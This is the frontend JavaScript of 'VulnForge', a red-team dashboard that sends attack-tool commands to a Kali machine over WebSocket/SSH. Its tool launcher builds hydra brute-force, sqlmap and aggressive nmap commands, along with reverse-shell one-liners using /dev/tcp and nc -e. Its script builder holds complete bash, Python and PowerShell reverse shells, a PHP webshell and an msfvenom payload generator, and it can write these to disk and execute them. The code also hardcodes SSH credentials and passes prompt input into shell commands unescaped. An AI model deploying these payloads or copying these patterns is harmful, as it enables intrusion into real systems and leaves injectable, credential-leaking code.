/**
 * ============================================================
 *  VulnForge — Frontend Controller
 *  WebSocket · SSH · Arsenal · Reports · Script Builder
 * ============================================================
 */

let ws;

document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const output          = document.getElementById('terminal-output');
    const statusInd       = document.getElementById('status-indicator');
    const statusText      = document.getElementById('status-text');
    const connBadge       = document.getElementById('conn-badge');
    const connTitle       = document.getElementById('terminal-title');
    const cmdInput        = document.getElementById('cmd-input');
    const btnConnect      = document.getElementById('btn-connect');
    const btnDisconnect   = document.getElementById('btn-disconnect');
    const btnSend         = document.getElementById('btn-send');
    const targetInput     = document.getElementById('target-ip');
    const connSelector    = document.getElementById('conn-selector');
    const activeConn      = document.getElementById('active-conn-display');
    const connDot         = document.getElementById('conn-dot');
    const connLabel       = document.getElementById('conn-label');
    const scriptEditor    = document.getElementById('script-editor');
    const scriptName      = document.getElementById('script-name');
    const deployLog       = document.getElementById('deploy-log');
    const deployLogText   = document.getElementById('deploy-log-text');

    let activeConnectionId = null;
    let connections = [];

    // ============================================================
    //  REPORTS SYSTEM
    // ============================================================
    let reports = [];
    let currentToolRunning = null;   // tool ID currently being run
    let outputBuffer = '';           // accumulated output for parsing

    window.reports = reports; // expose for debugging

    function addReport(report) {
        report.id = Date.now();
        report.timestamp = new Date().toLocaleTimeString();
        reports.unshift(report); // newest first
        renderReports();
    }

    function renderReports() {
        const container = document.getElementById('reports-container');
        const count     = document.getElementById('report-count');
        if (!container) return;

        if (reports.length === 0) {
            container.innerHTML = `
                <div class="report-empty">
                    <div class="icon">📂</div>
                    <div>No reports yet</div>
                    <div class="text-[10px] mt-1 text-gray-700">Run a scan from the Arsenal to see results here</div>
                </div>`;
            if (count) count.textContent = '(0)';
            return;
        }

        if (count) count.textContent = `(${reports.length})`;

        container.innerHTML = reports.map(r => {
            let bodyHtml = '';

            if (r.type === 'nmap') {
                bodyHtml = renderNmapReport(r);
            } else if (r.type === 'gobuster') {
                bodyHtml = renderGobusterReport(r);
            } else {
                bodyHtml = `<div class="text-[11px] text-gray-500 font-mono">${r.raw?.substring(0, 300) || 'No data'}</div>`;
            }

            const toolColor = r.type === 'nmap' ? 'text-violet-400' : r.type === 'gobuster' ? 'text-sky-400' : 'text-gray-400';

            return `
                <div class="report-card">
                    <div class="flex items-center justify-between mb-1.5">
                        <span class="text-[10px] font-semibold uppercase tracking-wider ${toolColor}">${r.type} › ${r.target}</span>
                        <span class="text-[9px] text-gray-700">${r.timestamp}</span>
                    </div>
                    ${bodyHtml}
                </div>`;
        }).join('');
    }

    function renderNmapReport(r) {
        if (!r.ports || r.ports.length === 0) {
            return `<div class="text-[11px] text-gray-600">${r.raw?.substring(0, 400) || 'No open ports found'}</div>`;
        }
        let html = `<div class="text-[10px] text-gray-600 mb-1.5">Open ports: <span class="text-neon">${r.ports.length}</span></div>`;
        html += `<div class="flex flex-wrap gap-1.5">`;
        r.ports.forEach(p => {
            html += `<span class="port-badge">${p.port}/${p.protocol || 'tcp'}
                <span class="service-tag">${p.service || p.state || '?'}</span>
                ${p.version ? `<span class="text-[8px] text-gray-700 ml-1">${p.version}</span>` : ''}
            </span>`;
        });
        html += `</div>`;
        if (r.os) html += `<div class="text-[10px] text-gray-700 mt-1.5">OS: ${r.os}</div>`;
        return html;
    }

    function renderGobusterReport(r) {
        if (!r.dirs || r.dirs.length === 0) {
            return `<div class="text-[11px] text-gray-600">${r.raw?.substring(0, 400) || 'No directories found'}</div>`;
        }
        let html = `<div class="text-[10px] text-gray-600 mb-1.5">Found: <span class="text-neon">${r.dirs.length}</span> directories</div>`;
        html += `<div class="space-y-0.5">`;
        r.dirs.forEach(d => {
            const color = d.status < 300 ? 'text-neon' : d.status < 400 ? 'text-yellow-400' : 'text-gray-600';
            html += `<div class="text-[11px] font-mono">
                <span class="${color}">[${d.status}]</span>
                <span class="text-gray-400">${d.path}</span>
                ${d.size ? `<span class="text-gray-700 text-[9px]">(${d.size})</span>` : ''}
            </div>`;
        });
        html += `</div>`;
        return html;
    }

    function clearReports() {
        reports = [];
        renderReports();
        showToast('Reports cleared');
    }
    window.clearReports = clearReports;

    // ── Parse Nmap output ──
    function parseNmapOutput(text, target) {
        const report = { type: 'nmap', target, ports: [], os: '', raw: text };

        // Extract open ports
        const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
        let match;
        while ((match = portRegex.exec(text)) !== null) {
            report.ports.push({
                port: match[1],
                protocol: match[2],
                state: 'open',
                service: match[3] || '?',
                version: (match[4] || '').trim()
            });
        }

        // Extract OS
        const osMatch = text.match(/OS details:\s*(.+)/i);
        if (osMatch) report.os = osMatch[1].trim();
        else {
            const osMatch2 = text.match(/Aggressive OS guesses:\s*(.+)/i);
            if (osMatch2) report.os = osMatch2[1].split(',')[0].trim();
        }

        if (report.ports.length > 0 || report.os) {
            addReport(report);
            showToast(`📊 Nmap report: ${report.ports.length} ports`);
        }
        return report;
    }

    // ── Parse Gobuster output ──
    function parseGobusterOutput(text, target) {
        const report = { type: 'gobuster', target, dirs: [], raw: text };

        const dirRegex = /(?:^|\n)\/(\S+)\s+\(Status:\s*(\d+)\)/g;
        let match;
        while ((match = dirRegex.exec(text)) !== null) {
            report.dirs.push({ path: '/' + match[1], status: parseInt(match[2]) });
        }

        // Alternative: "Found: /path (Status: 200) [Size: 123]"
        const dirRegex2 = /Found:\s+(\/\S+)\s+\(Status:\s*(\d+)\)/g;
        while ((match = dirRegex2.exec(text)) !== null) {
            // Avoid duplicates
            if (!report.dirs.some(d => d.path === match[1])) {
                report.dirs.push({ path: match[1], status: parseInt(match[2]) });
            }
        }

        if (report.dirs.length > 0) {
            addReport(report);
            showToast(`📊 Gobuster report: ${report.dirs.length} dirs`);
        }
        return report;
    }

    // ============================================================
    //  SALIDA EN TERMINAL
    // ============================================================
    window.appendOutput = function (text) {
        output.textContent += text + (text.endsWith('\n') ? '' : '\n');

        // Buffer for report parsing (collect up to 100KB)
        if (currentToolRunning) {
            outputBuffer += text + '\n';
            if (outputBuffer.length > 100000) {
                // Force parse if buffer gets too large
                finishToolOutput();
            }
        }

        requestAnimationFrame(() => {
            output.scrollTop = output.scrollHeight;
        });
    };

    // Called when we detect a tool has finished
    function finishToolOutput() {
        if (!currentToolRunning || !outputBuffer) return;
        const tool = currentToolRunning;
        const buf = outputBuffer;
        const target = targetInput.value.trim() || 'unknown';

        // Small delay to let the DOM settle
        setTimeout(() => {
            if (tool === 'nmap') parseNmapOutput(buf, target);
            else if (tool === 'gobuster') parseGobusterOutput(buf, target);
        }, 100);

        currentToolRunning = null;
        outputBuffer = '';
    }

    window.appendBanner = function () {
        appendOutput('');
        appendOutput('  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗');
        appendOutput('  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝');
        appendOutput('  ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║  ███╗█████╗  ');
        appendOutput('  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  ');
        appendOutput('   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗');
        appendOutput('    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('  🌐 Red Team Dashboard  |  🔗 vulnforge.local  |  ⚡ 24 modules loaded');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('');
    };

    // ============================================================
    //  CONNECTION MANAGER (localStorage)
    // ============================================================
    function loadConnections() {
        try {
            const stored = localStorage.getItem('vulnforge_connections');
            connections = stored ? JSON.parse(stored) : [];
        } catch {
            connections = [];
        }
        renderConnections();
    }

    function saveConnections() {
        localStorage.setItem('vulnforge_connections', JSON.stringify(connections));
        renderConnections();
    }

    function renderConnections() {
        connSelector.innerHTML = '<option value="">-- Select target --</option>';
        connections.forEach((c, i) => {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = `${c.name || 'Unknown'} (${c.ip})`;
            connSelector.appendChild(opt);
        });
        if (activeConnectionId !== null) {
            const exists = connections.some((_, i) => i === activeConnectionId);
            if (!exists) { activeConnectionId = null; hideActiveConn(); }
            else { showActiveConn(connections[activeConnectionId]); }
        }
    }

    function showActiveConn(conn) {
        activeConn.classList.remove('hidden');
        connDot.className = 'conn-dot ' + (ws && ws.readyState === WebSocket.OPEN ? 'online' : 'offline');
        connLabel.textContent = `${conn.name} (${conn.ip})`;
    }

    function hideActiveConn() {
        activeConn.classList.add('hidden');
    }

    window.showAddConnection = function () {
        document.getElementById('add-conn-form').classList.remove('hidden');
    };
    window.toggleAddConnection = function () {
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    window.saveConnection = function () {
        const name = document.getElementById('new-conn-name').value.trim();
        const ip   = document.getElementById('new-conn-ip').value.trim();
        const user = document.getElementById('new-conn-user').value.trim();
        const pass = document.getElementById('new-conn-pass').value;
        if (!name || !ip || !user || !pass) {
            alert('⚠️  Fill in all fields: Alias, IP, User, Pass');
            return;
        }
        connections.push({ name, ip, user, pass });
        saveConnections();
        showToast(`✓ Connection "${name}" saved`);
        document.getElementById('new-conn-name').value = '';
        document.getElementById('new-conn-ip').value = '';
        document.getElementById('new-conn-user').value = '';
        document.getElementById('new-conn-pass').value = '';
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    connSelector.addEventListener('change', () => {
        const idx = parseInt(connSelector.value);
        if (isNaN(idx)) return;
        activeConnectionId = idx;
        const conn = connections[idx];
        showActiveConn(conn);
        targetInput.value = conn.ip;
    });

    window.disconnectConn = function () {
        disconnectWS();
        activeConnectionId = null;
        hideActiveConn();
        connSelector.value = '';
    };

    // ============================================================
    //  WEBSOCKET — SSH
    // ============================================================
    function connectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[!] Already connected.');
            return;
        }
        let sshIp = '192.168.214.142';
        let sshUser = 'javi';
        let sshPass = 'javi';
        if (activeConnectionId !== null) {
            const conn = connections[activeConnectionId];
            sshIp = conn.ip; sshUser = conn.user; sshPass = conn.pass;
            appendOutput(`[*] Connecting to ${conn.name} (${sshIp})...`);
        } else {
            appendOutput('[*] Connecting to Kali (default)...');
        }
        ws = new WebSocket('ws://localhost:8000/ws');

        ws.onopen = () => {
            statusInd.classList.replace('bg-blood', 'bg-neon');
            statusInd.style.boxShadow = '0 0 8px rgba(0,255,65,0.6)';
            statusText.textContent = 'ONLINE';
            statusText.classList.replace('text-gray-500', 'text-neon');
            if (activeConnectionId !== null) connDot.className = 'conn-dot online';
            connBadge.textContent = `connected: ${sshUser}@${sshIp}`;
            connTitle.textContent = `─╼ ${sshUser}@${sshIp} ╾─────────────────────────────────────`;
            ws.send(JSON.stringify({ type: 'auth', ip: sshIp, user: sshUser, pass: sshPass }));
        };

        ws.onmessage = (event) => {
            const data = event.data;

            // Handle JSON protocol messages
            if (typeof data === 'string' && data.startsWith('{') && data.includes('"type"')) {
                try {
                    const msg = JSON.parse(data);
                    if (msg.type === 'connected') {
                        appendOutput(`[+] ${msg.message || 'SSH connection established'}`);
                    } else if (msg.type === 'error') {
                        appendOutput(`[!] ${msg.message || 'Unknown error'}`);
                    }
                    return;
                } catch {}
            }

            // Check if this output signals tool completion (prompt pattern)
            if (currentToolRunning && data.includes('~$ ') && !data.includes('▶ ')) {
                // Tool probably finished — give it a moment then parse
                finishToolOutput();
            }

            appendOutput(data);
        };

        ws.onclose = () => {
            statusInd.classList.replace('bg-neon', 'bg-blood');
            statusInd.style.boxShadow = '0 0 8px rgba(255,0,64,0.6)';
            statusText.textContent = 'OFFLINE';
            statusText.classList.replace('text-neon', 'text-gray-500');
            connBadge.textContent = 'disconnected';
            connDot.className = 'conn-dot offline';
            appendOutput('\n[!] Connection closed.');
            ws = null;
        };
    }

    function disconnectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[*] Closing connection...');
            ws.close();
        } else {
            appendOutput('[!] No active connection.');
        }
    }

    // ============================================================
    //  COMMAND SENDING
    // ============================================================
    window.sendCommand = function () {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return;
        }
        const cmd = cmdInput.value.trim();
        if (!cmd) return;
        ws.send(cmd);
        cmdInput.value = '';
    };

    window.sendPredefinedCmd = function (cmd) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first before launching modules.');
            return;
        }
        appendOutput(`\n▶ ${cmd}`);
        ws.send(cmd);
    };

    // ============================================================
    //  🚀 LAUNCH TOOL
    // ============================================================
    window.launchTool = function (tool) {
        const target = targetInput.value.trim();
        const needsTarget = [
            'gobuster','dirb','wfuzz','ffuf','nikto','whatweb','wpscan',
            'nmap','masscan','netcat','dnsrecon',
            'enum4linux','smbclient',
            'hydra-ssh','hydra-ftp','sqlmap'
        ];
        if (needsTarget.includes(tool) && !target) {
            alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
            targetInput.focus();
            return;
        }

        let command = '';
        let description = '';

        switch (tool) {
            // ── Web Recon ──
            case 'gobuster':
                command = `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 -q`;
                description = 'Gobuster — directory enumeration';
                break;
            case 'dirb':
                command = `dirb http://${target} /usr/share/wordlists/dirb/common.txt`;
                description = 'Dirb — directory brute force';
                break;
            case 'wfuzz':
                command = `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://${target}/FUZZ`;
                description = 'Wfuzz — web fuzzing';
                break;
            case 'ffuf':
                command = `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${target}/FUZZ`;
                description = 'Ffuf — fast web fuzzer';
                break;
            case 'nikto':
                command = `nikto -h http://${target}`;
                description = 'Nikto — web vulnerability scanner';
                break;
            case 'whatweb':
                command = `whatweb ${target}`;
                description = 'WhatWeb — technology fingerprinting';
                break;
            case 'wpscan':
                command = `wpscan --url http://${target} --no-update --disable-tls-checks`;
                description = 'Wpscan — WordPress scanner';
                break;

            // ── Network ──
            case 'nmap':
                command = `nmap -p- -sV -sC -O -A --min-rate=1000 -T4 ${target}`;
                description = 'Nmap — aggressive full scan';
                break;
            case 'masscan':
                command = `masscan -p1-65535 --rate=1000 ${target}`;
                description = 'Masscan — mass port scan (65535)';
                break;
            case 'netcat':
                command = `nc -zv ${target} 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 8080 8443`;
                description = 'Netcat — fast TCP scan (24 ports)';
                break;
            case 'dnsrecon':
                command = `dnsrecon -d ${target}`;
                description = 'Dnsrecon — DNS enumeration';
                break;

            // ── SMB / Windows ──
            case 'enum4linux':
                command = `enum4linux -a ${target}`;
                description = 'Enum4linux — full SMB enumeration';
                break;
            case 'smbclient':
                command = `smbclient -L //${target} -N`;
                description = 'Smbclient — list SMB shares (null session)';
                break;

            // ── Pivoting ──
            case 'ligolo':
                command = `echo "╔════════════════════════════════════════╗\n║  Ligolo-ng — Pivot Tunneling Guide    ║\n╚════════════════════════════════════════╝\n\n[Kali] sudo ip tuntap add user \$(whoami) mode tun ligolo\n[Kali] sudo ip link set ligolo up\n[Kali] ligolo-ng proxy -selfcert\n\n[Target] wget http://${target}:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent\n[Target] ligolo-ng agent -connect ${target}:11601 -ignore-cert\n\n[Proxy] sudo ip route add <subnet>/24 dev ligolo\n[Proxy] session > start"`;
                description = 'Ligolo-ng — pivot agent guide';
                break;
            case 'nc-listener':
                command = `echo "╔════════════════════════════════════════╗\n║  Netcat Listener — Reverse Shell      ║\n╚════════════════════════════════════════╝\n\n[Kali] rlwrap nc -lvnp 4444\n\n[Target Bash] bash -i >& /dev/tcp/${target}/4444 0>&1\n[Target NC] nc -e /bin/sh ${target} 4444\n\n⚠️  Run the listener in a separate terminal."`;
                description = 'NC Listener — reverse shell guide';
                break;

            // ── Crypto / Decode ──
            case 'jwt-decode': {
                const token = prompt('🔑 Paste your JWT token:');
                if (!token) return;
                command = `echo "${token}" | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Invalid JWT"`;
                description = 'JWT Decode — token payload';
                break;
            }
            case 'b64-encode': {
                const text = prompt('📝 Text to encode (Base64):');
                if (!text) return;
                command = `echo -n "${text}" | base64 -w0`;
                description = 'Base64 Encode';
                break;
            }
            case 'b64-decode': {
                const b64 = prompt('🔐 Base64 string to decode:');
                if (!b64) return;
                command = `echo "${b64}" | base64 -d 2>/dev/null || echo "Invalid Base64"`;
                description = 'Base64 Decode';
                break;
            }
            case 'john': {
                const hashType = prompt('🔑 Hash mode:\n> Leave empty for auto-detect:', '');
                const mode = hashType.trim() ? `--format=${hashType.trim()}` : '';
                command = `echo "John guide: ${mode || 'auto'}"`;
                description = 'John — hash cracker guide';
                break;
            }
            case 'hashcat': {
                const hcMode = prompt('⚡ Hashcat mode (default 0=MD5):', '0');
                command = `echo "Hashcat mode ${hcMode || 0}"`;
                description = 'Hashcat — GPU hash cracker guide';
                break;
            }

            // ── Exploitation ──
            case 'hydra-ssh':
                command = `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${target} -t 4`;
                description = 'Hydra SSH — brute force (rockyou)';
                break;
            case 'hydra-ftp':
                command = `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${target} -t 4`;
                description = 'Hydra FTP — brute force (rockyou)';
                break;
            case 'sqlmap':
                command = `sqlmap -u http://${target} --batch --random-agent`;
                description = 'Sqlmap — automatic SQL injection';
                break;
            case 'searchsploit':
                command = `searchsploit ${target} 2>/dev/null || echo "[!] No results for: ${target}"`;
                description = 'Searchsploit — exploit search';
                break;

            default:
                appendOutput(`[!] Unknown tool: "${tool}"`);
                return;
        }

        // Set current tool for report parsing
        if (['nmap', 'gobuster'].includes(tool)) {
            currentToolRunning = tool;
            outputBuffer = '';
        }

        const sep = '─'.repeat(52);
        appendOutput(`\n${sep}`);
        appendOutput(`  🚀 ${description}`);
        appendOutput(`  🎯 ${target || '(no target needed)'}`);
        appendOutput(`  \$ ${command}`);
        appendOutput(`${sep}`);

        window.sendPredefinedCmd(command);
    };

    // ============================================================
    //  TAB SYSTEM
    // ============================================================
    window.switchTab = function (tabName) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));

        // Activate the clicked tab
        const btns = document.querySelectorAll('.tab-btn');
        const panes = {
            terminal: 0,
            reports: 1,
            scripts: 2
        };
        if (panes[tabName] !== undefined) {
            btns[panes[tabName]].classList.add('active');
        }
        document.getElementById(`tab-${tabName}`).classList.add('active');
    };

    // ============================================================
    //  CATEGORY TOGGLE
    // ============================================================
    window.toggleCategory = function (header) {
        const body = header.nextElementSibling;
        const arrow = header.querySelector('span:first-child');
        if (body.style.display === 'none') {
            body.style.display = '';
            arrow.textContent = '▶';
        } else {
            body.style.display = 'none';
            arrow.textContent = '▼';
        }
    };

    // ============================================================
    //  SCRIPT BUILDER — Templates
    // ============================================================
    const SCRIPT_TEMPLATES = {
        'blank': { lang: 'bash', content: '#!/bin/bash\n\n# Your payload here\n' },

        'bash-rev': { lang: 'bash', content: `#!/bin/bash
# Bash Reverse Shell
# Usage: ./script.sh <LHOST> <LPORT>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
` },

        'python-rev': { lang: 'python', content: `#!/usr/bin/env python3
# Python3 Reverse Shell
# Usage: python3 script.py <LHOST> <LPORT>

import sys, socket, subprocess, os

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.x"
LPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")
` },

        'php-webshell': { lang: 'php', content: `<?php
// PHP WebShell
// Upload to target and access: http://target/shell.php?cmd=whoami

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>` },

        'powershell-rev': { lang: 'powershell', content: `# PowerShell Reverse Shell
# Run: powershell -NoP -NonI -W Hidden -Exec Bypass -f script.ps1

$LHOST = "10.10.14.x"
$LPORT = 4444

$c = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS " + (pwd).Path + "> ";
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
}
$c.Close()
` },

        'msfvenom': { lang: 'bash', content: `#!/bin/bash
# Msfvenom Payload Generator
# Usage: ./gen.sh <LHOST> <LPORT> <TYPE>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"
TYPE="\${3:-linux}"

case $TYPE in
    linux)
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev_shell.elf
        ;;
    windows)
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev_shell.exe
        ;;
    php)
        msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.php
        ;;
    python)
        msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.py
        ;;
    *)
        echo "Usage: \$0 <LHOST> <LPORT> <linux|windows|php|python>"
        ;;
esac
echo "[+] Payload generated: rev_shell.\$TYPE"
` }
    };

    let savedScripts = [];

    function loadSavedScripts() {
        try {
            const stored = localStorage.getItem('vulnforge_scripts');
            savedScripts = stored ? JSON.parse(stored) : [];
        } catch { savedScripts = []; }
    }

    function saveSavedScripts() {
        localStorage.setItem('vulnforge_scripts', JSON.stringify(savedScripts));
    }

    window.selectScriptTemplate = function (name) {
        // Update active button
        document.querySelectorAll('.script-template-btn').forEach(b => b.classList.remove('active'));
        event.target.classList.add('active');

        const tmpl = SCRIPT_TEMPLATES[name];
        if (tmpl) {
            scriptEditor.value = tmpl.content;
            document.getElementById('script-lang').textContent = tmpl.lang;
            document.getElementById('script-line-count').textContent =
                tmpl.content.split('\n').length + ' lines';
            if (!scriptName.value) scriptName.value = name + '.sh';
        }
    };

    window.deployScript = function () {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return;
        }

        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'payload.sh';
        if (!content) {
            alert('⚠️  Script editor is empty.');
            return;
        }

        // Show deploy log
        deployLog.classList.remove('hidden');
        deployLogText.textContent = '';

        // Escape content for SSH echo
        const escaped = content
            .replace(/\\/g, '\\\\')
            .replace(/`/g, '\\`')
            .replace(/\$/g, '\\$')
            .replace(/"/g, '\\"');

        // Write to file on Kali, make executable, and run
        const cmd = `echo "${escaped}" > /tmp/${name} && chmod +x /tmp/${name} && echo "[+] Written to /tmp/${name}"`;

        deployLogText.textContent += `> Writing script to /tmp/${name}...\n`;
        appendOutput(`\n[*] Deploying script: ${name}`);

        // First write
        ws.send(cmd);

        // Ask if execute
        setTimeout(() => {
            if (confirm(`🚀 Script written to /tmp/${name}.\n\nExecute it now?`)) {
                const execCmd = `cd /tmp && ./${name}`;
                deployLogText.textContent += `> Executing: ${execCmd}\n`;
                appendOutput(`[*] Executing: ${execCmd}`);
                ws.send(execCmd);
            } else {
                deployLogText.textContent += `> Ready at /tmp/${name}\n`;
                appendOutput(`[*] Script saved to /tmp/${name} (not executed)`);
            }
        }, 500);

        showToast(`⬆ Script "${name}" deployed`);
    };

    window.saveScript = function () {
        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'untitled.sh';
        if (!content) {
            alert('⚠️  Editor is empty.');
            return;
        }
        // Avoid duplicates
        const idx = savedScripts.findIndex(s => s.name === name);
        if (idx >= 0) savedScripts[idx].content = content;
        else savedScripts.push({ name, content, saved: new Date().toLocaleString() });

        saveSavedScripts();
        document.getElementById('script-status').textContent = `✓ saved "${name}"`;
        showToast(`💾 Script "${name}" saved locally`);
    };

    window.loadScript = function () {
        if (savedScripts.length === 0) {
            alert('📂 No saved scripts found.');
            return;
        }
        const list = savedScripts.map((s, i) => `${i + 1}. ${s.name} (${s.saved})`).join('\n');
        const choice = prompt(`📂 Saved scripts:\n\n${list}\n\nEnter number to load:`);
        const idx = parseInt(choice) - 1;
        if (idx >= 0 && idx < savedScripts.length) {
            const s = savedScripts[idx];
            scriptEditor.value = s.content;
            scriptName.value = s.name;
            document.getElementById('script-line-count').textContent = s.content.split('\n').length + ' lines';
            document.getElementById('script-status').textContent = `📂 loaded "${s.name}"`;
            showToast(`📂 Loaded "${s.name}"`);
        }
    };

    // Update line count on edit
    scriptEditor.addEventListener('input', () => {
        document.getElementById('script-line-count').textContent =
            (scriptEditor.value.match(/\n/g) || []).length + 1 + ' lines';
    });

    // ============================================================
    //  TOAST NOTIFICATIONS
    // ============================================================
    function showToast(msg) {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // ============================================================
    //  EVENT LISTENERS
    // ============================================================
    btnConnect.addEventListener('click', connectWS);
    btnDisconnect.addEventListener('click', disconnectWS);
    btnSend.addEventListener('click', window.sendCommand);

    cmdInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.sendCommand();
    });

    targetInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.launchTool('gobuster');
    });

    // ── Init ──
    loadConnections();
    loadSavedScripts();
    window.appendBanner();
});
